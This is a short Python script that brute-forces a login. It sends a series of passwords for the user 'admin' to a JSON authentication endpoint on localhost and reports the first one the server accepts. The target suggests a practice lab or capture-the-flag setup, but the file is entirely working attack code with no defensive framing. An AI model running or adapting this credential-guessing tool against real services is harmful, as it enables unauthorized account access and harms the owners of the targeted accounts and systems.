#!/bin/python3

import requests
from colorama import Fore

def send_request(url, endpoint, username, password):
  response = requests.post(f"{url}{endpoint}", json={"username": username, "password": password})
  return response.json()

def brute_force(url, endpoint, username, wordlist):
  for password in wordlist:
    result = send_request(url, endpoint, username, password)
    if "message" in result:
      print(f"{Fore.RED}{username}:{password} => {result['message']}")
    else:
      print(f"{Fore.GREEN}{username}:{password} => {result}")
      break

if __name__ == "__main__":

  username = "admin"
  wordlist = ["password", "outloooook", "adminadminadmin", "ojjqnhzosdnvnZHBRI"]

  url = "http://localhost:9000"

  endpoint = "/api/auth"

  brute_force(url, endpoint, username, wordlist)